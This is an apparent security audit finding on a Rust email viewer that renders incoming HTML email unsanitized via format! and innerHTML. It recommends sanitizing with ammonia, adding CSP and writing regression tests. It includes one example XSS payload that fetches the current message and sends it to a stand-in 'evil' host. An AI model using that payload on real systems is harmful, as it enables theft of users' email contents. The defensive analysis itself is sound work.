---
bead: vu-nqj
polecat: dementus
date: 2026-05-17
files:
  - src/email.rs
  - src/web.rs
severity: high
category: architecture
---

# Email body HTML is rendered to the browser without any sanitization

In `Email::parse_body` the raw HTML body from `mail-parser` is stored
verbatim:

```rust
// src/email.rs:237-239
if let Some(html_body) = message.body_html(0) {
    self.body_html = Some(html_body.to_string());
}
```

That same string is then handed straight to the browser. The initial
shell injects it via `format!(... {} ...)` directly into the document
body (`src/web.rs:594-596`, `src/web.rs:611`), and the SSE refresh path
in the JS sets it via `innerHTML`:

```js
// src/web.rs:498
document.querySelector('.email-content').innerHTML = emailData.body_html;
// src/web.rs:711 (welcome shell variant)
```

There is no sanitization step anywhere between MIME parse and the
browser — `grep -rn 'sanitize\|ammonia\|html5ever' src/` returns
nothing, and no HTML-sanitizer crate is listed in `Cargo.toml`.

Any received email therefore has full read access to the rendered
page: a malicious sender can drop `<script>fetch('/api/current-email')
.then(r=>r.json()).then(d=>fetch('https://evil/'+btoa(JSON
.stringify(d))))</script>` into an HTML part and exfiltrate the user's
currently focused message — and, on every selection change (the SSE
loop refires every 200 ms, `src/web.rs:272`), the next one too. Tracking
pixels, remote `<link rel=stylesheet>` references, web fonts, and
`<iframe src=...>` all work today as well: a sender can ping
`?msg-opened=<recipient>` the moment the user looks at the message.

This is the single highest-severity finding in this audit pass. It
turns the "render-only" viewer into a same-origin attack surface
against any future authenticated state the server adds (compose,
attachments, account switching, future search APIs).

## Suggested next step

- File a P1 bead: "Sanitize incoming HTML before /api/current-email
  and /". Likely fix: pipe `body_html` through `ammonia` with a
  conservative allowlist (no `<script>`, no inline event handlers,
  strip `<style>` or scope it, strip remote `<link>`/`<img>`/`<iframe>`
  or rewrite to a "load remote content?" placeholder).
- Pair with [[2026-05-17-vu-nqj-no-csp-header-on-web-pane]] — sanitizer
  is defense in depth, CSP is the belt-and-suspenders header.
- Add a regression test asserting that `<script>`, `onerror=`, and
  remote `<img src=...>` survive a round trip through the rendered
  HTML *only in a stripped form*.
